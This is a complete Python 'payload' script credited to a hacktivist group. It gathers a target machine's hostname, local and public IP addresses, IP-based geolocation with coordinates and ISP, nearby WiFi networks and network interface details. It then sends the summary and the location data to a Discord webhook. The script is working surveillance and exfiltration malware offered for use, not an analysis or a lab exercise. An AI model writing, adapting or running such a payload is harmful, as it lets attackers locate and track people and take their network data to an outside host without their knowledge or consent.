#!/usr/bin/env python3
"""
Geolocation Finder Payload
Determines device geolocation using IP address and WiFi data
⚡ EchoDead - Hacktivist Collective
"""

import os
import sys
import platform
import socket
import json
import urllib.request
import urllib.error
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

def get_public_ip():
    """Get public IP address"""
    services = [
        'https://api.ipify.org?format=json',
        'https://api.my-ip.io/ip.json',
        'https://ifconfig.me/ip',
    ]
    
    for service in services:
        try:
            with urllib.request.urlopen(service, timeout=5) as response:
                data = response.read().decode('utf-8')
                
                if 'json' in service:
                    return json.loads(data).get('ip')
                else:
                    return data.strip()
        except:
            continue
    
    return None

def get_geolocation_by_ip(ip_address):
    """Get geolocation data from IP address"""
    # Free IP geolocation services
    services = [
        f'http://ip-api.com/json/{ip_address}',
        f'https://ipapi.co/{ip_address}/json/',
        f'https://ipwhois.app/json/{ip_address}',
    ]
    
    for service in services:
        try:
            with urllib.request.urlopen(service, timeout=5) as response:
                data = json.loads(response.read().decode('utf-8'))
                
                # Normalize different API response formats
                location = {
                    'ip': ip_address,
                    'country': data.get('country') or data.get('country_name'),
                    'country_code': data.get('countryCode') or data.get('country_code'),
                    'region': data.get('regionName') or data.get('region'),
                    'city': data.get('city'),
                    'zip': data.get('zip') or data.get('postal'),
                    'lat': data.get('lat') or data.get('latitude'),
                    'lon': data.get('lon') or data.get('longitude'),
                    'timezone': data.get('timezone'),
                    'isp': data.get('isp'),
                    'org': data.get('org') or data.get('organization'),
                    'as': data.get('as') or data.get('asn'),
                }
                
                # Filter out None values
                location = {k: v for k, v in location.items() if v is not None}
                
                return location
        except Exception as e:
            continue
    
    return None

def get_local_ip():
    """Get local IP address"""
    try:
        # Create socket to get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return None

def get_network_interfaces():
    """Get network interface information"""
    interfaces = {}
    
    try:
        if platform.system() == "Windows":
            import subprocess
            result = subprocess.run(
                'ipconfig /all',
                shell=True,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                current_adapter = None
                for line in result.stdout.splitlines():
                    line = line.strip()
                    
                    if 'adapter' in line.lower():
                        current_adapter = line
                        interfaces[current_adapter] = {}
                    elif current_adapter and ':' in line:
                        key, value = line.split(':', 1)
                        interfaces[current_adapter][key.strip()] = value.strip()
        else:
            import subprocess
            result = subprocess.run(
                'ip addr show',
                shell=True,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                # Parse Linux ip addr output
                interfaces['raw'] = result.stdout[:500]  # First 500 chars
    except:
        pass
    
    return interfaces

def get_wifi_networks():
    """Get nearby WiFi networks (Windows)"""
    networks = []
    
    if platform.system() != "Windows":
        return networks
    
    try:
        import subprocess
        result = subprocess.run(
            'netsh wlan show networks mode=bssid',
            shell=True,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0:
            current_network = {}
            
            for line in result.stdout.splitlines():
                line = line.strip()
                
                if line.startswith('SSID'):
                    if current_network:
                        networks.append(current_network)
                    ssid = line.split(':', 1)[1].strip()
                    current_network = {'ssid': ssid}
                
                elif line.startswith('Signal'):
                    signal = line.split(':', 1)[1].strip()
                    current_network['signal'] = signal
                
                elif line.startswith('BSSID'):
                    bssid = line.split(':', 1)[1].strip()
                    current_network['bssid'] = bssid
            
            if current_network:
                networks.append(current_network)
    except:
        pass
    
    return networks[:10]  # Limit to 10 networks

def estimate_location_google_maps(wifi_networks):
    """
    Placeholder for Google Geolocation API
    (Requires API key - not implemented)
    """
    # This would require Google Geolocation API key
    # https://developers.google.com/maps/documentation/geolocation/overview
    return None

def main():
    print("=" * 70)
    print("GEOLOCATION FINDER PAYLOAD")
    print("=" * 70)
    print(f"\nExecution Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Platform: {platform.system()} {platform.release()}")
    print(f"Hostname: {platform.node()}\n")
    
    # Get local IP
    print("🌐 Getting local IP address...")
    local_ip = get_local_ip()
    if local_ip:
        print(f"   Local IP: {local_ip}\n")
    else:
        print("   ⚠️  Could not determine local IP\n")
    
    # Get public IP
    print("🌍 Getting public IP address...")
    public_ip = get_public_ip()
    
    if public_ip:
        print(f"   Public IP: {public_ip}\n")
        
        # Get geolocation
        print("📍 Determining geolocation...")
        location = get_geolocation_by_ip(public_ip)
        
        if location:
            print("\n" + "=" * 70)
            print("GEOLOCATION DATA")
            print("=" * 70 + "\n")
            
            for key, value in location.items():
                print(f"  {key.capitalize()}: {value}")
            
            # Display map coordinates
            if 'lat' in location and 'lon' in location:
                print(f"\n🗺️  Google Maps: https://www.google.com/maps?q={location['lat']},{location['lon']}")
                print(f"🗺️  OpenStreetMap: https://www.openstreetmap.org/?mlat={location['lat']}&mlon={location['lon']}&zoom=12")
        else:
            print("   ⚠️  Could not retrieve geolocation data\n")
    else:
        print("   ⚠️  Could not determine public IP\n")
        location = None
    
    # Get WiFi networks
    print("\n" + "=" * 70)
    print("NEARBY WIFI NETWORKS")
    print("=" * 70 + "\n")
    
    print("📡 Scanning WiFi networks...")
    wifi_networks = get_wifi_networks()
    
    if wifi_networks:
        print(f"\n✅ Found {len(wifi_networks)} networks:\n")
        for i, network in enumerate(wifi_networks, 1):
            print(f"  {i}. {network.get('ssid', 'Hidden')}")
            print(f"     Signal: {network.get('signal', 'N/A')}")
            if 'bssid' in network:
                print(f"     BSSID: {network['bssid']}")
            print()
    else:
        print("ℹ️  No WiFi networks detected (or WiFi adapter not available)\n")
    
    # Get network interfaces
    print("=" * 70)
    print("NETWORK INTERFACES")
    print("=" * 70 + "\n")
    
    interfaces = get_network_interfaces()
    
    if interfaces:
        print(f"📶 Found {len(interfaces)} network interface(s)\n")
        
        for adapter, details in list(interfaces.items())[:3]:  # First 3
            print(f"  {adapter}")
            if isinstance(details, dict):
                for key, value in list(details.items())[:5]:  # First 5 properties
                    if value and len(value) < 100:  # Skip long values
                        print(f"    {key}: {value}")
            else:
                print(f"    {details[:200]}")  # First 200 chars
            print()
    else:
        print("ℹ️  Could not retrieve network interface information\n")
    
    # Summary
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    
    summary = {
        "Platform": f"{platform.system()} {platform.release()}",
        "Hostname": platform.node(),
        "Local IP": local_ip or "Unknown",
        "Public IP": public_ip or "Unknown",
        "WiFi Networks": len(wifi_networks),
        "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    
    if location:
        summary["Country"] = location.get('country', 'Unknown')
        summary["City"] = location.get('city', 'Unknown')
        summary["ISP"] = location.get('isp', 'Unknown')
        
        if 'lat' in location and 'lon' in location:
            summary["Coordinates"] = f"{location['lat']}, {location['lon']}"
            summary["Google Maps"] = f"https://maps.google.com/?q={location['lat']},{location['lon']}"
    
    for key, value in summary.items():
        print(f"{key}: {value}")
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("\n📤 Sending report to Discord...")
        if send_to_discord("📍 Geolocation Report", summary):
            print("✅ Report sent successfully!")
            
            # Send detailed location data
            if location:
                print("📤 Sending detailed location data...")
                send_to_discord("🌍 Detailed Geolocation", location)
        else:
            print("⚠️  Discord webhook not configured")
    else:
        print("\n⚠️  Webhook module not available")
    
    print("\n✅ Geolocation reconnaissance complete!")

if __name__ == "__main__":
    main()
